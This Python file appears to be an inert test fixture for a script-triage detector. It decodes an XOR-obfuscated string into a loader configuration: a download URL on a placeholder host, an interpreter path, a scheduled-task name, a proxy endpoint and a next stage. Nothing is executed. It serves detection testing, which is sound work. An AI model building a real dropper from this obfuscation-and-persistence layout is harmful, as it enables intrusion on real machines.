#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_1242d62d = "e8a3ace2edeafbeeeda3eeecf1f8f7f2fbc1f6f1edeab2fffdefebf7ecfbc1ecfbf3f1eafbb2fafbfdf1fafbc1fbf3fcfbfafafbfab2e9ecf7eafbc1f8f7f2fbb2faf7edeeffeafdf6c1eeecf1fdfbedede2fffaffeeeafbeca3eeecf1e6e7c1fdf2f7fbf0eac1f6fff0faf1f8f8e2edeafff9fbc1fdf1ebf0eaa3abe2ede7f0eaffe6a3e9fff2ecebedc1fcf7f0faf7f0f9e2f1fcf8ebedfdffeaf7f1f0a3fbe6fdfbeeeaf7f1f0c1ecf1ebeaf7f0f9e2fdffececf7fbeca3eee7acfbe6fbc1e9f7f0faf1e9edc1edfbece8f7fdfbe2e9f7f0faf1e9edc1fdf6fff7f0a3edfbece8f7fdfbc1fafbedfdecf7eeeaf1ece2fdfff3eefff7f9f0c1f7faa3fdfff3eefff7f9f0b3fbaaafa6aca7a8fca7a9e2ebecf2a3f6eaeaeeeda4b1b1fbaaafa6aca7a8fca7a9b0fbe6fff3eef2fbb0f7f0e8fff2f7fab1fcfcfdfdfdfdababb0eee7e2ebedfbecc1fff9fbf0eaa3d6ebf0eaecfbededcee7eaf6f1f0b1fbaaafa6aca7a8fca7a9e2f8f7f2fbc1eeffeaf6a3dda4b1ceecf1f9ecfff3daffeaffb1d6ebf0eaecfbededd2fffcb1b0ebeefaffeafbb3fbaaafa6aca7a8fca7a9b0eee7e2f7f0eafbeceeecfbeafbecc1eeffeaf6a3dda4b1ceecf1f9ecfff3daffeaffb1cee7eaf6f1f0b3fbaaafa6aca7a8fca7a9b1eee7eaf6f1f0b0fbe6fbe2eaffedf5c1f0fff3fba3cde7edeafbf3cbeefaffeafbb3fbaaafa6aca7a8fca7a9e2eeecf1e6e7c1fbf0faeef1f7f0eaa3afaca9b0aeb0aeb0afa4aca6ada7ace2f0fbe6eac1edeafff9fba3ecfbedf1ebecfdfbb3edfff3eef2fbb0eeedaf"
CODEC_1242d62d = "hex_literal|single_byte_xor|9e"

def load_1242d62d():
    return bytes.fromhex(MATERIAL_1242d62d)

def decode_1242d62d(v_a19c):
    return bytes(value ^ 158 for value in v_a19c)

def recover_1242d62d():
    v_d41a = "left" if 2 > 1 else "right"
    v_f602 = decode_1242d62d
    v_b27e = v_f602(load_1242d62d())
    v_c304 = v_b27e.decode("ascii", "strict")
    return v_c304

def inspect_1242d62d():
    view = memoryview(recover_1242d62d().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_1242d62d():
    return surface if (surface := ("walrus_binding", "exception_routing", "py2exe_windows_service", "service_descriptor")) else ()

def obfuscation_1242d62d():
    try:
        {}["missing"]
    except KeyError:
        return "exception_routing"

def plan_1242d62d():
    fields = dict(item.split("=", 1) for item in inspect_1242d62d().split("|"))
    analysis_surface = surface_1242d62d()
    obfuscation_surface = obfuscation_1242d62d()
    operation_plan = ("proxy_client_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_1242d62d())
